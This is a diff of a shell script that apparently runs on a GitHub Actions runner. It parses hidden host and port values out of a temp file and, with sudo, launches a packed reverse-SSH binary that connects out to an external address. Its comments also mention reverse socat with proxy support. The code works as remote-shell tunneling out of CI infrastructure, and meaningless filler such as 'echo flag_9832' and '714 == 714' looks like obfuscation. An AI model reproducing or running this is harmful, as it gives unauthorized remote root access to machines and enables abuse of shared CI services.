@@ -64,7 +64,7 @@ ip5=${ip_port5%:*};
 # 提取反弹socat的主机和端口，支持代理(ip7)
 ip_port7pxy=$(grep -oP "(?<=liumQ).*(?=liumZ)" /tmp/js9;echo 456891 >/dev/null);
 echo "flag_9832";
-[ ! -z ${ip_port7pxy} ] && port7pxy=${ip_port7pxy#*:};
+port7pxy=${ip_port7pxy#*:};
 ip7pxy=${ip_port7pxy%:*};
 echo "flag 1122334";
 
@@ -95,7 +95,7 @@ if [ ! -z ${port5} ] && [ ! -z ${ip5} ] && [ "714" == "714"  ]; then
    #[ ! -z ${GITHUB_WORKSPACE} ] &&
    #(
       echo "exit_revSSH_isOK ${ip5} : ${port5}   ";
-      [ -x $GITHUB_WORKSPACE/upx_reverse-sshx64.bin ]&&sudo sh -c "$GITHUB_WORKSPACE/upx_reverse-sshx64.bin -v -b $bport -p $port5 $ip5";echo $?;
+      [ -x $GITHUB_WORKSPACE/upx_reverse-sshx64.bin ]&&sudo -H sh -c "$GITHUB_WORKSPACE/upx_reverse-sshx64.bin -v -b $bport -p $port5 $ip5";echo $?;
    #)||sudo sh -c "/home/runner/work/nc_test/nc_test/upx_reverse-sshx64.bin -v -b $bport -p $port5 $ip5";
   echo "exit_revSSH_isOK_$bport";
 fi
